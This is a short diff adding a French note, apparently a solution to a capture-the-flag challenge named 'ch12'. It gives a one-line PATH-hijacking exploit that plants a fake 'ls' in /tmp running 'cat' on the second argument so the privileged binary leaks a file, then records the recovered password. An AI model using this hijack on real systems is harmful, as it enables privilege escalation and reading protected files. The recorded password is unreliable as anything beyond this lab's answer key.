@@ -1,0 +1,5 @@
+La meme chose que le precedent mais on va appeler cat avec le 2e argument
+
+echo "cat \$2" > /tmp/ls ; chmod +x /tmp/ls ; export PATH=/tmp:$PATH ; ./ch12
+
+password = 8a95eDS/*e_T#
